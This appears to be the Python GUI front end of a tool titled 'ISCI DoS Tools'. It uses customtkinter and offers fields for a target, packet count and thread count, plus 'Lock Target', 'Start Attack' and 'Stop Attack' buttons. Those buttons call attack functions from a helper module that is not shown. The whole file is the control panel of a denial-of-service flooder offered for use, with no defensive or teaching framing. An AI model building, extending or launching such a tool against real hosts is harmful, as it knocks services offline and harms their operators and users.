from PIL import ImageTk, Image  
from lib.function import *
import customtkinter
import tkinter

customtkinter.set_appearance_mode("System") 
customtkinter.set_default_color_theme("dark-blue")

app = customtkinter.CTk()
app.title("~ ISCI DoS Tools ~")
center(app, 400, 600)

frame = customtkinter.CTkFrame(master=app, width=400, height=600)
frame.pack(padx=10, pady=20, fill="x", expand=True)

images = Image.open("./assets/isci07.png")
resized_image = images.resize((100, 100))
img = ImageTk.PhotoImage(resized_image)
label1 = tkinter.Label(image=img)
label1.image = img
label1.pack()
label1.place(x=150, y=5)

TARGET = tkinter.StringVar()
add_input(customtkinter, frame, "Target", TARGET)

add_button(customtkinter, frame, "Lock Target", button_event=lambda:event_button_target(customtkinter, app, TARGET.get()))

PACKETS = tkinter.IntVar()
add_input(customtkinter, frame, "Packets", PACKETS)

THREADS = tkinter.IntVar()
add_input(customtkinter, frame, "Thread", THREADS)

add_button(customtkinter, frame, "Start Attack", button_event=lambda:attack_thread(TARGET.get(), PACKETS.get(), THREADS.get()))

add_button(customtkinter, frame, "Stop Attack", button_event=lambda:stop(app))

app.mainloop()